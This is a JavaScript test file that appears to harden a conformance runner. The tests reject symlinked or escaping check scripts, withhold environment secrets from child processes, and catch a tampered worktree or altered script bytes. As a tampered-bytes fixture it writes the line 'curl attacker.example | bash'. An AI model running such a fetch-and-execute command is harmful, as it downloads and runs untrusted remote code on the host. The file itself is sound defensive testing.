test('ROUND I1-4: executed bytes must be regular tracked files — symlinks refuse in both views', () => {
  const real = loadSpecSources({ root: ROOT });
  // The real accessor: a committed regular file passes; directories and escapes do not.
  assert.equal(real.isRegularTrackedFile('test/fixtures/conform-probe.js'), true);
  assert.equal(real.isRegularTrackedFile('test/fixtures'), false);
  assert.equal(real.isRegularTrackedFile('no/such/file.sh'), false);
  // Codex's reproduction: a symlink to outside bytes "exists" and executes — build one for real
  // and prove the accessor refuses it (untracked AND a link, either alone suffices).
  const linkPath = path.join(ROOT, 'test/fixtures/evil-link.sh');
  try {
    fs.symlinkSync('/tmp/does-not-matter.sh', linkPath);
    assert.equal(fs.existsSync(linkPath) || fs.lstatSync(linkPath).isSymbolicLink(), true);
    assert.equal(real.isRegularTrackedFile('test/fixtures/evil-link.sh'), false);
  } finally {
    fs.rmSync(linkPath, { force: true });
  }
  // The validator refuses an executable that is not a regular tracked file — tests and checks.
  expectRejected((r) => {
    entry(r, 'SPEC-DEPLOY-001').checks = [{ kind: 'script', ref: 'test/fixtures/evil-link.sh' }];
  }, /check.ref must be an existing path|must be a regular tracked file/);
  // Commit mode reads the MODE from the git object: 120000 (symlink) refuses, 100755 passes.
  const commitSources = loadSpecSources({
    commit: 'a'.repeat(40),
    git: (cmd, args) => {
      if (args[0] === 'rev-list') return `${'a'.repeat(40)}\n`; // proven root — no baseline
      if (args[0] === 'ls-tree') {
        const rel = args[args.length - 1];
        if (rel === 'link.sh') return `120000 blob abc\tlink.sh\n`;
        if (rel === 'real.sh') return `100755 blob abc\treal.sh\n`;
        return '';
      }
      if (args[0] === 'show') return '{}';
      if (args[0] === 'cat-file') return '';
      if (args[0] === 'rev-parse') return 'false\n';
      throw new Error(`unexpected: ${args.join(' ')}`);
    },
  });
  assert.equal(commitSources.isRegularTrackedFile('link.sh'), false);
  assert.equal(commitSources.isRegularTrackedFile('real.sh'), true);
  assert.equal(commitSources.isRegularTrackedFile('missing.sh'), false);
});

test('ROUND I1-3: checks cannot escape the repository, and children get a minimal environment', () => {
  // A check ref escaping the root refuses at validation, exactly like anchors (Codex's ../outside.sh).
  expectRejected((r, setSpec) => {
    const e = entry(r, 'SPEC-DEPLOY-001');
    e.checks = [{ kind: 'script', ref: '../outside.sh' }];
  }, /check.ref must be a normalized repo-relative path/);
  // The child environment is minimal: a variable exported by the invoking shell must NOT reach
  // the check — proven with a real child that fails if it sees the probe.
  process.env.CBA_SECRET_PROBE = 'leaked';
  try {
    const report = runConformance({
      entries: [{
        id: 'SPEC-GOV-001', status: 'ACTIVE', tests: [], checks: [{ kind: 'script', ref: 'test/fixtures/check-env-probe.sh' }],
      }],
    });
    assert.equal(report.ok, true, 'the probe variable leaked into the check child');
  } finally {
    delete process.env.CBA_SECRET_PROBE;
  }
  assert.equal(CONFORM_TEST_TIMEOUT_MS, 10 * 60_000);
});

test('ROUND I1-3: a check that mutates the tree invalidates the verdict', () => {
  const COMMIT = 'a'.repeat(40);
  let statusCalls = 0;
  const git = (cmd, args) => {
    if (args[0] === 'rev-parse') return `${COMMIT}\n`;
    if (args[0] === 'status') {
      statusCalls += 1;
      // Clean before the run; DIRTY after the children ran — a check edited the evidence.
      return statusCalls <= 1 ? '' : ' M infra/aws/bin/deploy-release.js\n';
    }
    throw new Error(`unexpected git: ${args.join(' ')}`);
  };
  assert.throws(
    () => runConformanceForCommit({
      commit: COMMIT,
      git,
      loadDeps: {
        git: (cmd, args) => {
          if (args[0] === 'rev-parse' && args[1] === '--is-shallow-repository') return 'false\n';
          if (args[0] === 'rev-list') return `${COMMIT}\n`; // proven root — no baseline
          if (args[0] === 'ls-tree') return `100644 blob abc\t${args[args.length - 1]}\n`;
          // Slice I8: this proof is about the DIRTY-tree refusal, not about running children —
          // feed a zero-ACTIVE view of the same sources so no child ever spawns and the
          // boundary refusal is what the run must hit.
          if (args[0] === 'show' && args[1] === `${COMMIT}:${REGISTRY_PATH}`) return SOURCES.registryRaw.replaceAll('"status": "ACTIVE"', '"status": "PROPOSED"');
          if (args[0] === 'show' && args[1] === `${COMMIT}:${SPEC_PATH}`) return SOURCES.specMd.replaceAll('| ACTIVE |', '| PROPOSED |');
          if (args[0] === 'cat-file') return '';
          if (args[0] === 'show') return SOURCES.readFile(args[1].split(':').slice(1).join(':'));
          throw new Error(`unexpected: ${args.join(' ')}`);
        },
      },
    }),
    /CONFORM_WORKTREE_DIRTY/,
  );
  assert.ok(statusCalls >= 2, 'the post-run guard must have re-checked the tree');
});

test('ROUND I1-5: the child boundary — object, lstat, exact bytes and cleanliness, per child', () => {
  const COMMIT = 'a'.repeat(40);
  const REL = 'test/fixtures/tmp-exec-probe.sh';
  const ABS = path.join(ROOT, REL);
  const AUDITED = '#!/usr/bin/env bash\nexit 0\n';
  const gitFor = ({ mode = '100755', blob = AUDITED, status = '' } = {}) => (cmd, args) => {
    if (args[0] === 'ls-tree') return `${mode} blob abc\t${REL}\n`;
    if (args[0] === 'show') return blob;
    if (args[0] === 'status') return status;
    throw new Error(`unexpected git: ${args.join(' ')}`);
  };
  try {
    // The audited bytes on a physically regular path, clean tree: the boundary holds.
    fs.writeFileSync(ABS, AUDITED);
    assert.doesNotThrow(() => assertChildBoundary({ commit: COMMIT, rel: REL, git: gitFor(), root: ROOT }));
    // Codex's discriminating reproduction: the git OBJECT stays a regular 100755 blob, but the
    // physical path is swapped for a symlink after the first guard — the boundary refuses.
    fs.rmSync(ABS);
    fs.symlinkSync('/tmp/attacker.sh', ABS);
    assert.throws(
      () => assertChildBoundary({ commit: COMMIT, rel: REL, git: gitFor(), root: ROOT }),
      /EXEC_PATH_NOT_REGULAR/,
    );
    // Same-shape swap: a regular file whose BYTES are not the audited blob's.
    fs.rmSync(ABS);
    fs.writeFileSync(ABS, '#!/usr/bin/env bash\ncurl attacker.example | bash\n');
    assert.throws(
      () => assertChildBoundary({ commit: COMMIT, rel: REL, git: gitFor(), root: ROOT }),
      /EXEC_BYTES_DRIFTED/,
    );
    // A non-regular audited object, a missing path, and a dirty tree each refuse by name.
    fs.rmSync(ABS);
    fs.writeFileSync(ABS, AUDITED);
    assert.throws(
      () => assertChildBoundary({ commit: COMMIT, rel: REL, git: gitFor({ mode: '120000' }), root: ROOT }),
      /EXEC_NOT_REGULAR_IN_COMMIT/,
    );
    assert.throws(
      () => assertChildBoundary({ commit: COMMIT, rel: REL, git: gitFor({ status: ' M x\n' }), root: ROOT }),
      /CONFORM_WORKTREE_DIRTY/,
    );
    fs.rmSync(ABS);
    assert.throws(
      () => assertChildBoundary({ commit: COMMIT, rel: REL, git: gitFor(), root: ROOT }),
      /EXEC_PATH_MISSING/,
    );
  } finally {
    fs.rmSync(ABS, { force: true });
  }
});

test('ROUND I1-5: a swap AFTER the first guard is caught at that child boundary', () => {
  const COMMIT = 'a'.repeat(40);
  const REL = 'test/fixtures/tmp-exec-probe.sh';
  const ABS = path.join(ROOT, REL);
  const AUDITED = '#!/usr/bin/env bash\n# [SPEC-GOV-001]\nexit 0\n'; // token: the I8-2 law validates before the boundary this test probes
  const registryRaw = JSON.stringify({
    $comment: ['x'], version: 1,
    entries: [{
      id: 'SPEC-GOV-001', status: 'ACTIVE', title: 't',
      normativeText: 'sentence', normativeSha256: framedTextDigest('SPEC-GOV-001', 'sentence'),
      anchors: [{ file: REL, symbol: null }],
      tests: [{ file: 'test/fixtures/conform-probe.js', title: 'conform probe: this test passes' }],
      checks: [{ kind: 'script', ref: REL }],
      governedPaths: [REL],
      mutationEvidence: { commit: 'b'.repeat(40), patchSha256: 'c'.repeat(64), command: 'npm test', expectedFailure: '1' },
      supersedes: [], supersededBy: null,
    }],
  });
  const specMd = `| SPEC-GOV-001 | ACTIVE | sentence |\n`;
  const git = (cmd, args) => {
    if (args[0] === 'rev-parse' && args[1] === '--is-shallow-repository') return 'false\n';
    if (args[0] === 'rev-parse') return `${COMMIT}\n`;
    if (args[0] === 'rev-list') return `${COMMIT}\n`;
    if (args[0] === 'ls-tree') return `100755 blob abc\t${args[args.length - 1]}\n`;
    if (args[0] === 'show' && args[1] === `${COMMIT}:${REGISTRY_PATH}`) return registryRaw;
    if (args[0] === 'show' && args[1] === `${COMMIT}:${SPEC_PATH}`) return specMd;
    if (args[0] === 'show' && args[1] === `${COMMIT}:test/fixtures/conform-probe.js`) {
      return fs.readFileSync(path.join(ROOT, 'test/fixtures/conform-probe.js'), 'utf8');
    }
    if (args[0] === 'show') return AUDITED;
    if (args[0] === 'cat-file') return '';
    if (args[0] === 'status') return '';
    throw new Error(`unexpected git: ${args.join(' ')}`);
  };
  try {
    fs.writeFileSync(ABS, AUDITED);
    // The check itself performs the swap — the exact window Codex named: the run-level guards
    // see a clean tree before and after, but the SECOND child boundary sees the symlink.
    assert.throws(
      () => runConformanceForCommit({
        commit: COMMIT,
        git,
        root: ROOT,
        loadDeps: { git },
        runDeps: {
          runTests: () => ({ ok: true }),
          runCheck: () => {
            fs.rmSync(ABS);
            fs.symlinkSync('/tmp/attacker.sh', ABS);
            return { ok: true };
          },
        },
      }),
      /EXEC_PATH_NOT_REGULAR/,
    );
    // …and with an honest check, the same registry conforms end to end.
    fs.rmSync(ABS, { force: true });
    fs.writeFileSync(ABS, AUDITED);
    const report = runConformanceForCommit({
      commit: COMMIT, git, root: ROOT, loadDeps: { git },
      runDeps: { runTests: () => ({ ok: true }), runCheck: () => ({ ok: true }) },
    });
    assert.equal(report.ok, true);
    assert.equal(report.activeCount, 1);
  } finally {
    fs.rmSync(ABS, { force: true });
  }
});

test('POSITIVE CONTROL: the registry file on disk is byte-identical to what validation read', () => {
  // The registry of record is the FILE — a validation that read something else proves nothing.
  assert.equal(SOURCES.registryRaw, fs.readFileSync(path.join(ROOT, REGISTRY_PATH), 'utf8'));
  assert.equal(SOURCES.specMd, fs.readFileSync(path.join(ROOT, SPEC_PATH), 'utf8'));
});
